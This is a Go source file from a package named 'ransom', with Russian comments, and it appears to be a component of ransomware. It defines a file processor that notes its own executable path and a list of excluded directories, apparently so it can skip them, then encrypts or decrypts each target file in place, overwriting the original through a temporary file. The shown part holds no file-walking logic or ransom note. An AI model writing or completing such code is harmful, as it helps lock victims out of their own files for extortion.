package ransom

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
)

var (
	ErrExecutableNotFound = errors.New("не удалось определить путь к бинарнику")
)

type FileProcessor struct {
	crypto      *CryptoEngine
	excludeDirs map[string]struct{}
	selfPath    string
}

func NewFileProcessor(crypto *CryptoEngine, excludes []string) (*FileProcessor, error) {
	exePath, err := os.Executable()
	if err != nil {
		return nil, ErrExecutableNotFound
	}
	exePath = filepath.Clean(exePath)

	excludeMap := make(map[string]struct{})
	for _, dir := range excludes {
		excludeMap[dir] = struct{}{}
	}

	return &FileProcessor{
		crypto:      crypto,
		excludeDirs: excludeMap,
		selfPath:    exePath,
	}, nil
}

// ProcessFile выполняет атомарное чтение, обработку и запись файла
func (fp *FileProcessor) ProcessFile(path string, mode Mode) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("ошибка чтения: %w", err)
	}

	var processedData []byte
	if mode == ModeEncrypt {
		processedData, err = fp.crypto.Encrypt(data)
	} else {
		processedData, err = fp.crypto.Decrypt(data)
	}

	if err != nil {
		return fmt.Errorf("криптографическая ошибка: %w", err)
	}

	// Для безопасности пишем во временный файл, затем переименовываем
	tmpFile := path + ".tmp"
	err = os.WriteFile(tmpFile, processedData, 0666)
	if err != nil {
		return fmt.Errorf("ошибка записи временного файла: %w", err)
	}

	err = os.Rename(tmpFile, path)
	if err != nil {
		_ = os.Remove(tmpFile) // зачищаем за собой в случае сбоя
		return fmt.Errorf("ошибка замены оригинального файла: %w", err)
	}

	return nil
}
